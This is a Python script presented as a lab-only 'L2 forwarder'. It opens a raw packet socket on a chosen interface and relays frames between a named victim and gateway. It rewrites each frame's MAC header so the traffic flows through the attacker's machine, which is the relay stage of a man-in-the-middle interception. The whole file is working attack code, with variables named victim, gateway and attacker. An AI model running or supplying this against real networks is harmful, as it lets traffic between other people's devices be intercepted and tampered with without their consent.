#!/usr/bin/env python3
# fast_l2_redirect_full.py
# Optimized L2 forwarder for lab use only.
# Requirements: Linux, run as root.

import os
import sys
import socket
import struct
import subprocess

# --- settings loader (keeps your original behavior) ---
settings = {}
try:
    with open("puller.settings", "r") as f:
        for line in f:
            if not line.strip() or line.strip().startswith("#"):
                continue
            parts = line.split()
            if len(parts) >= 2:
                settings_name = parts[0].strip()
                setting = " ".join(parts[1:]).strip()
                settings[settings_name] = setting
except FileNotFoundError:
    # proceed; script will still run if CLI args supplied
    pass

if settings.get("mobile", "no") == "yes":
    from fcntl import ioctl
else:
    from fcntl import ioctl

# constants for ioctl and Ethernet
ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933

def if_hwaddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        info = ioctl(s.fileno(), SIOCGIFHWADDR, struct.pack('256s', ifname[:15].encode()))
        return info[18:24]
    finally:
        s.close()

def if_index(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return struct.unpack('i', res[16:20])[0]
    finally:
        s.close()

def resolve_mac_ip(iface, ip):
    # Use 'ip neigh show to <ip> dev <iface>' to get known neighbor info.
    # If the entry isn't present, this returns None.
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip, "dev", iface],
                                      stderr=subprocess.DEVNULL).decode(errors='ignore')
    except subprocess.CalledProcessError:
        return None
    # parse for mac like aa:bb:cc:dd:ee:ff
    for part in out.split():
        if ':' in part and len(part.split(':')) == 6:
            try:
                return bytes(int(b, 16) for b in part.split(':'))
            except Exception:
                continue
    return None

def mac_str_to_bytes(mac):
    return bytes(int(x,16) for x in mac.split(':'))

def usage():
    print("usage: sudo python3 fast_l2_redirect_full.py IFACE VICTIM_IP GATEWAY_IP")
    print("Alternatively, set puller.settings with lines like: iface eth0")
    sys.exit(1)

def main(argv):
    if os.geteuid() != 0:
        print("run as root")
        sys.exit(1)

    # CLI or settings fallback
    if len(argv) >= 4:
        IFACE = argv[1]
        VICTIM = argv[2]
        GATEWAY = argv[3]
    else:
        IFACE = settings.get("iface")
        VICTIM = settings.get("victim")
        GATEWAY = settings.get("gateway")
        if not (IFACE and VICTIM and GATEWAY):
            usage()

    # resolve MACs (ARPs must exist in the system ARP table)
    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs: victim_mac=%r gateway_mac=%r" % (victim_mac, gateway_mac))
        print("Make sure ARP entries exist (e.g., ping target, or add static arp entries).")
        sys.exit(1)

    attacker_mac = if_hwaddr(IFACE)
    ifindex = if_index(IFACE)

    # open raw AF_PACKET socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    # enlarge buffers
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    s.bind((IFACE, 0))

    # --- prepare optimized constants used in hot loop ---
    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac

    # prebuilt 12-byte headers (dst(6) + src(6))
    hdr_v_to_g = g_mac + a_mac
    hdr_g_to_v = v_mac + a_mac

    # integer forms for cheap comparisons (48-bit integers)
    v_mac_int = int.from_bytes(v_mac, 'big')
    g_mac_int = int.from_bytes(g_mac, 'big')
    a_mac_int = int.from_bytes(a_mac, 'big')

    # local references for speed
    _sendmsg = s.sendmsg
    _recvmsg_into = s.recvmsg_into

    MAX_FRAME = 65536
    buf = bytearray(MAX_FRAME)
    mv = memoryview(buf)

    def mac_to_str(b):
        return ':'.join(f"{x:02x}" for x in b)

    print("attacker mac:", mac_to_str(a_mac))
    print("victim mac:  ", mac_to_str(v_mac))
    print("gateway mac: ", mac_to_str(g_mac))
    print("interface:   ", IFACE)
    print("starting loop... (Ctrl-C to stop)")

    try:
        while True:
            try:
                nbytes, ancdata, flags, addr = _recvmsg_into([buf], 0)
            except InterruptedError:
                continue
            except Exception as e:
                # transient recv errors: log and continue
                print("recv error:", e)
                continue

            if not nbytes or nbytes <= 14:
                continue

            frame = mv[:nbytes]  # memoryview into the receive buffer

            # read source MAC as integer without allocating bytes
            try:
                src_int = int.from_bytes(frame[6:12], 'big')
            except Exception:
                # malformed frame; skip
                continue

            # ignore frames we injected
            if src_int == a_mac_int:
                continue

            # decide routing by source MAC
            if src_int == v_mac_int:
                # victim -> gateway: replace dst with gateway MAC, src with attacker MAC
                try:
                    _sendmsg([hdr_v_to_g, frame[12:]])
                except BlockingIOError:
                    # socket would block; in lab scenarios this is acceptable to drop
                    continue
                except Exception as e:
                    print("send error:", e)
                    continue
            elif src_int == g_mac_int:
                try:
                    _sendmsg([hdr_g_to_v, frame[12:]])
                except BlockingIOError:
                    continue
                except Exception as e:
                    print("send error:", e)
                    continue
            else:
                # not interested in other sources
                continue

    except KeyboardInterrupt:
        print("\nexiting.")
    finally:
        s.close()

if __name__ == "__main__":
    main(sys.argv)
